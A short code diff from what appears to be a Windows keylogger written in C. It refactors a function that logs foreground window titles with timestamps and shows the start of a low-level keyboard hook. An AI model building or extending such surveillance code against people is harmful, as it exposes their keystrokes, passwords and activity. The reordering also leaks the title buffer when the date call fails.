@@ -40,10 +40,6 @@ void get_foreground_window(HWND hwnd)
 	if (GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)) == 0)
 		return;
 
-	char *dateStr = GetDateFormated();
-	if (dateStr == NULL)
-		return;
-
 	int i = 0;
 	while (windowTitleW[i] != '\0' && i < 256 - 1)
 	{
@@ -53,13 +49,16 @@ void get_foreground_window(HWND hwnd)
 	}
 	windowTitleW[i] = '\0';
 
+	// Convert wide string to UTF-8 by allocating a buffer
 	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
 	char *windowTitleUtf8 = (char *)malloc(utf8Len);
-	if (!windowTitleUtf8) {
-		free(dateStr);
+	if (!windowTitleUtf8)
 		return;
-	}
 	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);
+
+	char *dateStr = GetDateFormated();
+	if (dateStr == NULL)
+		return;
 
 	char logEntry[1024];
 	snprintf(logEntry, sizeof(logEntry), "\n[%s] - Foreground window title: '%s'\n", dateStr, windowTitleUtf8);
@@ -81,7 +80,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 )
 {
 	if (nCode >= 0)
-	{	
+	{
 
 		static HKL	KBLayoutCode = NULL;
 		HKL		newKBLayout = GetKeyboardLayout(0);
